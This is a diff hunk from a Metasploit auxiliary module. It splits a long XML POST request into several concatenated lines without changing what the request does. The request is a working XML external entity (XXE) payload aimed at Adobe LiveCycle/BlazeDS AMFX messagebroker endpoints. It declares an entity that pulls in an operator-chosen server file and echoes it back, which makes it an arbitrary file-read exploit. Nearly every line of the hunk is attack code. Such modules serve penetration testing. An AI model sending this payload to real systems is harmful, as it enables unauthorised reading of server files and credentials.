@@ -64,7 +64,15 @@ class Metasploit3 < Msf::Auxiliary
 			"/lcds-samples/messagebroker/httpsecure", # LCDS -- SSL
 		]
 
-		postrequest = "<\?xml version=\"1.0\" encoding=\"utf-8\"\?><\!DOCTYPE test [ <\!ENTITY x3 SYSTEM \"#{datastore['FILE']}\"> ]><amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"><body><object type=\"flex.messaging.messages.CommandMessage\"><traits><string>body</string><string>clientId</string><string>correlationId</string><string>destination</string><string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string><string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object><traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"
+		postrequest =  "<\?xml version=\"1.0\" encoding=\"utf-8\"\?>"
+		postrequest << "<\!DOCTYPE test [ <\!ENTITY x3 SYSTEM \"#{datastore['FILE']}\"> ]>"
+		postrequest << "<amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\">"
+		postrequest << "<body><object type=\"flex.messaging.messages.CommandMessage\"><traits>"
+		postrequest << "<string>body</string><string>clientId</string><string>correlationId</string><string>destination</string>"
+		postrequest << "<string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string>"
+		postrequest << "<string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object>"
+		postrequest << "<traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string>"
+		postrequest << "<int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"
 
 		path.each do | check |
 
